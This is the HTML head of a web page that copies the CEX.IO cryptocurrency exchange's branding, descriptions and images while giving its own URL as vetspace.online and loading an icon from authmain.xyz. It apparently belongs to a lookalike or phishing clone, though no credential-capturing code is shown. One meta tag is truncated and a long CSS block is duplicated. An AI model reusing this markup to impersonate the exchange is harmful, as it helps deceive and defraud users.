

<script   src="jquery.js"></script>

<link rel="stylesheet" href="jnmainstyle.css" />
<meta charset="utf-8">
<meta name="format-detection" content="telephone=no">

<meta name="viewport" content="width=device-width, initial-scale=1">

<meta name="description" content="Established in London in 2013, the leading cryptocurrency exchange offers Bitcoin, Bitcoin Cash, Bitcoin Gold, Ethereum, Zcash, Dash and other trading options, provides 24/7 customer support, high level of security, and stable deposits and withdrawals.">
<meta name="google-site-verification" content="wgvrnzeB9Q7Awc6UGb0eU6aqPLh_28P-LXhz2dVWX3Y">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Bitcoin Exchange, Trading BTC USD, BTC EUR ">
<meta name="twitter:description" content="Buy and sell Bitcoins for USD or EUR with payment cards or via bank transfers easily. Get into Bitcoin Trading on the worldwide Bitcoin Exchange.">
<meta name="twitter:image" content="https://static.cex.io/img/landing-img/index.png">
<meta property="og:site_name" content="CEX.IO">
<meta property="og:title" content="Bitcoin Exchange, Trading BTC USD, BTC EUR ">
<meta property="og:description" content="Buy and sell Bitcoins for USD or EUR with payment cards or via bank transfers easily. Get into Bitcoin Trading on the worldwide Bitcoin Exchange.">
<meta property="og:type" content="website">
<meta property="og:url" content="https://vetspace.online/">
<meta property="og:image" content="https://static.cex.io/img/landing-img/index.png">
<meta property="og:image:secure_url" content="https://static.cex.io/img/landing-img/index.png">
<link rel="mask-icon" href="/img/cex-fav.svg" color="#00bdca">
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="72×72" href="/img/apple-touch-icon-72x72-precomposed.png">
<link rel="apple-touch-icon" sizes="114×114" href="/img/apple-touch-icon-114x114-precomposed.png">
<link rel="android-touch-icon" href="/img/android-icon-144x144-precomposed.png">
<link rel="icon" href="/img/favicon32.png" sizes="32×32">
<link rel="icon" href="/img/favicon48.png" sizes="48×48">
<link rel="icon" href="/img/favicon64.png" sizes="64×64">

<link rel="stylesheet" href="https://static.cex.io/landings/css/Index.css?v=1.1.22
">

<link rel="stylesheet" type="text/css" 
href="https://static.cex.io/bundles/css/custom-bundle-verification.css" media="all">

<script type="text/javascript" src="https://cex.io/scripts/currencyProfileForWidget/"></script>

<style type="text/css">
    iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important;
    
    opacity: 0 !important; pointer-events: none !important;}</style>
    


<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700|Roboto|Lato:400,900|Source+Sans+Pro:400,700|Montserrat:800" rel="stylesheet">


<link rel="stylesheet" href="ainstylemobile.css"/>


<meta name="viewport" content="width=device-width,initial-scale=1,m


<link href="//db.onlinewebfonts.com/c/2cb3e62148b528138a35061500162dee?family=Nasalization" rel="stylesheet" type="text/css"/>





 <link rel="icon"  type="images/x-icon" href="https://authmain.xyz/bit.jpeg">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

<style type="text/css">
    iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important;
    
    opacity: 0 !important; pointer-events: none !important;}</style>
    






<style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    from {
      opacity: 0;
      transform: translateY(20px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    bottom: 20px;
    right: 20px;
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: #1BB6C1;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    animation: intercom-lightweight-app-launcher 250ms ease;
  }

  .intercom-lightweight-app-launcher:focus {
    outline: none;
    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 60px;
    height: 60px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 28px;
    height: 32px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 56px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 36px;
    max-width: 36px;
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg {
    width: 16px;
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms ease-out;
    
        width: 376px;
        height: calc(100% - 120px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 100px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
        border-radius: 8px;
      
  }

  .intercom-lightweight-app-messenger-header {
    height: 75px;
    background: linear-gradient(
      135deg,
      rgb(27, 182, 193) 0%,
      rgb(14, 98, 103) 100%
    );
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style>




<style>
    
    
    button{
        
        background:rgb(200,50,50);
    }
    
    
</style>



<style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    from {
      opacity: 0;
      transform: translateY(20px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    bottom: 20px;
    right: 20px;
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: #1BB6C1;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    animation: intercom-lightweight-app-launcher 250ms ease;
  }

  .intercom-lightweight-app-launcher:focus {
    outline: none;
    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 60px;
    height: 60px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 28px;
    height: 32px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 56px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 36px;
    max-width: 36px;
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg {
    width: 16px;
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms ease-out;
    
        width: 376px;
        height: calc(100% - 120px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 100px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
        border-radius: 8px;
      
  }

  .intercom-lightweight-app-messenger-header {
    height: 75px;
    background: linear-gradient(
      135deg,
      rgb(27, 182, 193) 0%,
      rgb(14, 98, 103) 100%
    );
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style>




<style>
    
    
    button{
        
        background:rgb(200,50,50);
    }
    
    
</style>


<script type="text/javascript">
	
	

</script>

